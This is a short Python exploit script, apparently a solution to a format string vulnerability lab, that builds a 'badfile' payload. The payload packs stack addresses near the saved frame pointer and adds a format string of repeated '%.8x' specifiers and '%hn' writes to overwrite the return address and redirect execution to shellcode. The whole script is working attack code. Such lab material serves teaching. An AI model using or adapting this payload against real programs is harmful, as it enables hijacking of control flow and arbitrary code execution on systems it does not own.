#!/usr/bin/python3
import sys

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

# This line shows how to store a 4-byte integer at offset 0
#number = 0x080e506a
buf_addr = 0xffffd090
ebp_addr = 0xffffcfb8

number = ebp_addr + 0x8
content[0:4] = (number).to_bytes(4,byteorder='little')

content[4:8] = ("@@@@").encode('latin-1')

#number = 0x080e5068
number = ebp_addr + 0x4
content[8:12] = (number).to_bytes(4,byteorder='little')

# This line shows how to construct a string s with
#   12 of "%.8x", concatenated with a "%n"
#s = "%.8x"*62 + "%.43199x" + "%hn" + "%.8738x" + "%hn"
# 0xffff - 62x8 - 3x4 = 65027; 0xd99b < 0xffff, so using overflow
s = "%.8x"*62 + "%.65027x" + "%hn" + "%.00100x" + "%hn"
# The line shows how to store the string s at offset 8
fmt  = (s).encode('latin-1')
print("shellcode addr: ", hex(12+len(fmt)+buf_addr))
content[12:12+len(fmt)] = fmt

# Write the content to badfile
with open('badfile', 'wb') as f:
	f.write(content)
